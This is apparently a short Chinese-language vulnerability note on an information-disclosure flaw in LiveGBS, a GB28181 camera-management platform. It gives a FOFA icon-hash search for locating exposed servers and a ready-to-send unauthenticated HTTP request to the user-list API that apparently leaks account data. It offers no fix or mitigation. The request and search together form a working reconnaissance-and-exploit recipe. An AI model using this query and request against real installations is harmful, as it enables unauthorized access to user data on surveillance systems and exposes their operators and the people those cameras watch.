# LiveGBS list存在信息泄漏漏洞

# 一、漏洞简介
LiveGBS是一款基于GB28181协议的安防监控软件，专为集中统一管理和观看所有摄像头、硬盘录像机等设备而设计。它支持GB28181注册接入，可向上级联第三方国标平台，提供可视化的WEB页面管理，使用户能够轻松实现设备的远程监控和管理。LiveGBS具备多项强大功能，包括云台控制、设备录像检索与回放、语音对讲、用户管理等。同时，它支持多种协议流输出，实现浏览器无插件直播，让用户能够随时随地通过Web端查看监控画面。LiveGBS list存在信息泄漏漏洞

# 二、影响版本
+ LiveGBS 

# 三、资产测绘
+ fofa`icon_hash="-206100324"`
+ 特征

![1714840195509-17413bb5-8988-4807-907b-1335a5357ea9.png](./img/oU8IW4Y-oZEZ4Two/1714840195509-17413bb5-8988-4807-907b-1335a5357ea9-194956.png)

# 四、漏洞复现
```plain
GET /api/v1/user/list?q=&start=0&limit=100&enable=&sort=CreatedAt&order=desc HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
sec-ch-ua: "Google Chrome";v="117", "Chromium";v="117", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
```

![1715350016028-f7a9c754-ea7f-4f92-8743-04021b14f407.png](./img/oU8IW4Y-oZEZ4Two/1715350016028-f7a9c754-ea7f-4f92-8743-04021b14f407-360953.png)





> 更新: 2024-05-18 12:33:59  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ongy3487szmdw9ti>